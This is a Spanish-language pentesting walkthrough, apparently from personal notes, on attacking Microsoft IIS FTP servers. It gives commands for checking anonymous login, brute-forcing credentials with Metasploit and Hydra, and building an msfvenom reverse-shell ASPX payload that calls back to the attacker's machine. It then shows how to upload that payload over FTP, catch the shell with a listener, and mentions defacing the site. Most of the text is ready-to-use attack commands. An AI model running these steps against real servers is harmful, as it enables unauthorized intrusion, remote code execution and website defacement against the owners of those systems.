# Microsoft IIS FTP

Microsoft IIS (Internet Information server) funciona principalmente como servidor web, pero para analizar un servicio FTP es necesario escanear tanto el puerto 21 como el 80. Esto se debe a que Microsoft FTP es un paquete de Microsoft IIS. Cuando, durante un escaneo con `nmap` u otra situación, vemos *Microsoft ftpd (demon)*, significa que el servidor FTP se usa para permitir a usuarios autenticados modificar, subir o descargar archivos del directorio del servidor web.

### Acceso anonimo

Esta es una configuracón de FTP que permite a cualquiera acceder al servidor sin proporcionar credenciales. Esto se puede comprobar de varias formas:

**Mediante un script `nmap`:**

```bash
nmap -p <puerto> --script ftp-anon <IP>
```

**Usando el cliente ftp:**

```bash
ftp <IP> <puerto>
Name: anonymous
Password: <pulsamos enter sin escribir>
```

### Fuerza bruta

**Metasploit:**

```bash
msf auxiliary(scanner/ftp/ftp_login) > set rhosts <IP>
msf auxiliary(scanner/ftp/ftp_login) > set user_file <WORDLIST>
msf auxiliary(scanner/ftp/ftp_login) > set pass_file <WORDLIST>
msf auxiliary(scanner/ftp/ftp_login) > run
```

**Hydra:**

```bash
hydra -L <USR_WORDLIST> -P <PASS_WORDLIST> <IP> <SERVICE>
```

### Obtener una shell

FTP no permite obtener una shell de forma directa pero al estar asociado a IIS es probable que permita la ejecución de ciertos archivos, por ejemplo los archivos *.asp*. Si tenemos acceso al servidor FTP, podemos subir un payload con este formato para tratar de obtener una shell con acceso al sistema.

Para crear el payload:

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP_kali> LPORT=<puerto_kali> -f asp -o shell.aspx
```
Para subirlo al servidor mediante FTP:

```bash
ftp> put <archivo_local>
```

Creamos un listener:

```bash
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf exploit(multi/handler) > set lhost <IP_kali>
msf exploit(multi/handler) > set lport <puerto_kali>
msf exploit(multi/handler) > run
```

Por último accedemos al payload desde el navegador para ejecutarlo: *domimio.com/shell.aspx*

### Modificar la web

En el contexto de un pentest legal lo más probable es no tener permiso para modificar el contenido de la web, pero es bastante común que un atacante, una vez obtiene acceso, muestre algun tipo de mensaje para dejar claro que la web ha sido vulnerada. Esto lo podemos hacer simplemente modificando los archivos de la web mediante el acceso FTP.

[⟵ Anterior](../../05_sistema.md#explotación-windows)
